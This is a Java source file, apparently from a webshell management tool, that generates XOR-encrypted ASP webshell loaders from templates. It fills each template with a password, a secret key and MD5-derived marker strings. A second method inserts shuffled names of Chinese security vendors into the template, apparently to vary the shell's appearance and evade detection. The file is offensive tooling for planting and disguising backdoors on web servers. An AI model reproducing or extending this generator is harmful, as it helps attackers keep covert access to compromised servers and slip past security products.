

package shells.cryptions.aspXor;

import java.io.InputStream;
import java.util.Random;

import util.Log;
import util.TemplateEx;
import util.functions;

class Generate {
    Generate() {
    }

    public static byte[] GenerateShellLoder(String pass, String secretKey, String className) {
        byte[] data = null;
        String findStrMd5 = functions.md5(pass + secretKey);
        String findStrLeft = findStrMd5.substring(0, 6);
        String findStrRight = findStrMd5.substring(20, 26);

        try {
            InputStream inputStream = Generate.class.getResourceAsStream("template/" + className + ".bin");
            String code = new String(functions.readInputStream(inputStream));
            inputStream.close();
            code = code.replace("{pass}", pass).replace("{secretKey}", secretKey).replace("{findStrLeft}", findStrLeft).replace("{findStrRight}", findStrRight);
            code = TemplateEx.run(code);
            data = code.getBytes();
        } catch (Exception var9) {
            Exception e = var9;
            Log.error(e);
        }

        return data;
    }
    public static byte[] GenerateShellLodermessage(String pass, String secretKey, String className) {
        byte[] data = null;

        String findStrMd5 = functions.md5(pass + secretKey);
//        String findStrLeft = findStrMd5.substring(0, 6);
//        String findStrRight = findStrMd5.substring(20, 26);

        try {
            InputStream inputStream = Generate.class.getResourceAsStream("template/" + className + ".bin");
            String code = new String(functions.readInputStream(inputStream));
            inputStream.close();

            String[] arr = { "qianxin", "nsfocus", "sangfor", "dbappsecurity", "chaitin", "damddos", "alibaba", "baidu" ,"leadsec", "venustech",
                    "asiainfosec","qingteng","threatbook","antiy","dptech","hillstonenet","topsec","huawei","sina","webray",
                    "tencent","bytedance","douyin","westone"};
            shuffle(arr);
            code = code.replace("{pass}", pass).replace("{secretKey}", secretKey)
                    .replace("{stryi}", arr[0]).replace("{strer}", arr[1])
                    .replace("{strsan}", arr[2]).replace("{strsi}", arr[3])
                    .replace("{strwu}", arr[4]).replace("{strliu}", arr[5])
                    .replace("{strqi}", arr[6]).replace("{strba}", arr[7])
                    .replace("{strjiu}", arr[8]).replace("{strshi}", arr[9])
                    .replace("{strshiyi}", arr[10]).replace("{strshier}", arr[11])
                    .replace("{strshisan}", arr[12]).replace("{strshisi}", arr[13])
                    .replace("{strshiwu}", arr[14]).replace("{strshiliu}", arr[15])
                    .replace("{strshiqi}", arr[16]).replace("{strshiba}", arr[17])
                    .replace("{strshijiu}", arr[18]).replace("{strershi}", arr[19])
                    .replace("{strershiyi}", arr[20]).replace("{strershier}", arr[21])
                    .replace("{strershisan}", arr[22]).replace("{strershisi}", arr[23]);
            //System.out.println(arr[0]+" "+arr[1]+" "+arr[2]);
            code = TemplateEx.run(code);
            data = code.getBytes();
        } catch (Exception var9) {
            Exception e = var9;
            Log.error(e);
        }

        return data;
    }
    private static Random rand = new Random();

    public static <T> void swap(T[] a, int i, int j) {
        T temp = a[i];
        a[i] = a[j];
        a[j] = temp;
    }

    public static <T> void shuffle(T[] arr) {
        int length = arr.length;
        for (int i = length; i > 0; i--) {
            int randInd = rand.nextInt(i);
            swap(arr, randInd, i - 1);
        }
    }

}
